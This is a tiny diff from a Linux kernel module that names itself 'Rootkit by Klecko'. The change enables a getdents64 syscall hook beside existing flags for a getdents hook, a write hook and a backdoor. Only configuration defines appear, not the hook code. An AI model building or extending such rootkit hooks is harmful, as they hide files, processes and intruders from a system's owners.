@@ -7,6 +7,7 @@ MODULE_DESCRIPTION("Rootkit by Klecko");
 MODULE_VERSION("0.1");
 
 #define HOOK_GETDENTS	1
+#define HOOK_GETDENTS64	1
 #define HOOK_WRITE		0
 #define BACKDOOR		0
 
